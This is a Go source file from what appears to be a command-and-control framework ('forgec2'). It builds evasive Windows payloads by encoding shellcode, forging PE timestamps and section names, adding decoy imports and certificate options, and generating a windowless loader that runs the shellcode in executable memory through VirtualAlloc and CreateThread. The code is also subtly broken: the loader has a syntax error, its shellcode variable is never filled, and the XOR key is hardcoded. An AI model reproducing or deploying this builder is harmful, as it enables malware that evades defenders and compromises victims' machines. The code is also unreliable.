package payload

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"text/template"
)

type BuildArtifactRequest struct {
	TemplateName   string `json:"template_name"`
	OutputType     string `json:"output_type"`
	ShellcodeB64   string `json:"shellcode_b64"`
	RawEXEB64      string `json:"raw_exe_b64"`
	EncodeType     string `json:"encode_type"`
	EncodeKeyHex   string `json:"encode_key_hex"`
	PESectionText  string `json:"pe_section_text"`
	PESectionData  string `json:"pe_section_data"`
	PESectionRdata string `json:"pe_section_rdata"`
	PESectionReloc string `json:"pe_section_reloc"`
	EntryPoint     string `json:"entry_point"`
	Timestamp      string `json:"timestamp"`
	TimestampDate  string `json:"timestamp_date"`
	CertOption     string `json:"cert_option"`
	CertOrg        string `json:"cert_org"`
	ImportDLLs     string `json:"import_dlls"`
	OutputFilename string `json:"output_filename"`
}

func randomHex(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func readFileBase64(path string) (string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(data), nil
}

func BuildArtifact(req BuildArtifactRequest, dataDir string) ([]byte, string, error) {
	tmpl := DefaultArtifactTemplate(req.TemplateName)

	if req.OutputType != "" {
		tmpl.OutputType = req.OutputType
	}
	if req.PESectionText != "" {
		tmpl.PESections.Text = req.PESectionText
	}
	if req.PESectionData != "" {
		tmpl.PESections.Data = req.PESectionData
	}
	if req.PESectionRdata != "" {
		tmpl.PESections.Rdata = req.PESectionRdata
	}
	if req.PESectionReloc != "" {
		tmpl.PESections.Reloc = req.PESectionReloc
	}
	if req.EntryPoint != "" {
		tmpl.EntryPointTechnique = EntryPointTechnique(req.EntryPoint)
	}
	if req.Timestamp != "" {
		tmpl.Timestamp = TimestampOption(req.Timestamp)
		tmpl.TimestampValue = req.TimestampDate
	}
	if req.CertOption != "" {
		tmpl.CertOption = CertOption(req.CertOption)
		tmpl.CertOrg = req.CertOrg
	}
	if req.EncodeType != "" {
		tmpl.ShellcodeEncode = ShellcodeEncode(req.EncodeType)
	}
	if req.EncodeKeyHex != "" {
		tmpl.EncodeKey = req.EncodeKeyHex
	}
	if req.ImportDLLs != "" {
		tmpl.ImportManipulation = true
		tmpl.BenignImports = strings.Split(req.ImportDLLs, ",")
	}

	tmpDir, err := os.MkdirTemp("", "forgec2-pack-*")
	if err != nil {
		return nil, "", fmt.Errorf("temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	var payloadData []byte

	if req.ShellcodeB64 != "" {
		shellcode, err := base64.StdEncoding.DecodeString(req.ShellcodeB64)
		if err != nil {
			return nil, "", fmt.Errorf("shellcode base64: %w", err)
		}
		var encKey []byte
		if req.EncodeKeyHex != "" {
			encKey, err = hex.DecodeString(req.EncodeKeyHex)
			if err != nil {
				return nil, "", fmt.Errorf("invalid encode key hex: %w", err)
			}
		}
		if encKey == nil || len(encKey) == 0 {
			encKey = []byte(randomHex(8))
		}
		encoded, err := EncodeShellcode(shellcode, tmpl.ShellcodeEncode, encKey)
		if err != nil {
			return nil, "", fmt.Errorf("encode: %w", err)
		}
		payloadData = encoded
	} else if req.RawEXEB64 != "" {
		payloadData, err = base64.StdEncoding.DecodeString(req.RawEXEB64)
		if err != nil {
			return nil, "", fmt.Errorf("exe base64: %w", err)
		}
	} else {
		loaderSource := generateLoaderSource(tmpl)
		loaderPath := filepath.Join(tmpDir, "loader.go")
		if err := os.WriteFile(loaderPath, []byte(loaderSource), 0644); err != nil {
			return nil, "", fmt.Errorf("write loader: %w", err)
		}
		outPath := filepath.Join(tmpDir, "artifact.exe")
		goCmd := getGoCmd()
		if goCmd == "" {
			return nil, "", fmt.Errorf("go executable not found in PATH")
		}
		cmd := exec.Command(goCmd, "build", "-ldflags", "-s -w -H=windowsgui", "-o", outPath, loaderPath)
		var stderr bytes.Buffer
		cmd.Stderr = &stderr
		cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
		if err := cmd.Run(); err != nil {
			return nil, "", fmt.Errorf("go build: %w\n%s", err, stderr.String())
		}
		payloadData, err = os.ReadFile(outPath)
		if err != nil {
			return nil, "", fmt.Errorf("read artifact: %w", err)
		}
	}

	if len(payloadData) > 0 {
		ts, _ := GenerateTimestamp(tmpl.Timestamp, tmpl.TimestampValue)
		ApplyTimestamp(payloadData, ts)
		if tmpl.PESections != (PESectionConfig{}) {
			ApplyPESectionNames(payloadData, tmpl.PESections)
		}
		if tmpl.ImportManipulation && len(tmpl.BenignImports) > 0 {
			if err := AddBenignImports(payloadData, tmpl.BenignImports); err != nil {
				return nil, "", err
			}
		}
	}

	ext := ".bin"
	switch tmpl.OutputType {
	case "exe", "service_exe":
		ext = ".exe"
	case "dll":
		ext = ".dll"
	case "ps1":
		ext = ".ps1"
	}
	filename := req.OutputFilename
	if filename == "" {
		filename = "artifact" + ext
	}
	if !strings.HasSuffix(strings.ToLower(filename), ext) {
		filename += ext
	}

	return payloadData, filename, nil
}

func generateLoaderSource(tmpl ArtifactTemplate) string {
	encType := string(tmpl.ShellcodeEncode)
	if encType == "" {
		encType = "none"
	}
	ep := string(tmpl.EntryPointTechnique)
	if ep == "" {
		ep = "direct"
	}
	aesKey := make([]byte, 16)
	rand.Read(aesKey)
	aesKeyHex := hex.EncodeToString(aesKey)
	tmplSource := `package main

import (
	"syscall"
	"unsafe"
	"encoding/base64"
	"encoding/hex"
	"crypto/aes"
	"crypto/cipher"
)

var (
	kernel32        = syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc    = kernel32.MustFindProc("VirtualAlloc")
	virtualProtect  = kernel32.MustFindProc("VirtualProtect")
	createThread    = kernel32.MustFindProc("CreateThread")
	waitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
)

var encryptedShellcode = ""

func getShellcode() []byte {
	data, _ := hex.DecodeString(encryptedShellcode)
	if data == nil {
		return nil
	}
	switch "{{.EncType}}" {
	case "xor":
		key := []byte{0x41}
		for i := range data {
			data[i] ^= key[i%len(key)]
		}
	case "aes":
		k, _ := hex.DecodeString("{{.AESKey}}")
		block, _ := aes.NewCipher(k)
		iv := data[:aes.BlockSize]
		stream := cipher.NewCTR(block, iv)
		stream.XORKeyStream(data[aes.BlockSize:], data[aes.BlockSize:])
		data = data[aes.BlockSize:]
	}
	return data
}

func main() {
	sc := getShellcode()
	if sc == nil {
		return
	}
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x40)
	if addr == 0 {
		return
	}
	copy(*(*[]byte)(unsafe.Pointer(&addr))[:len(sc]:len(sc)], sc)
	old := 0
	virtualProtect.Call(addr, uintptr(len(sc)), 0x20, uintptr(unsafe.Pointer(&old)))
	thread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
	if thread == 0 {
		return
	}
	waitForSingleObject.Call(thread, 0xFFFFFFFF)
}
`
	data := map[string]string{
		"EncType":    encType,
		"EntryPoint": ep,
		"AESKey":     aesKeyHex,
	}
	t := template.Must(template.New("loader").Parse(tmplSource))
	var buf bytes.Buffer
	t.Execute(&buf, data)
	return buf.String()
}
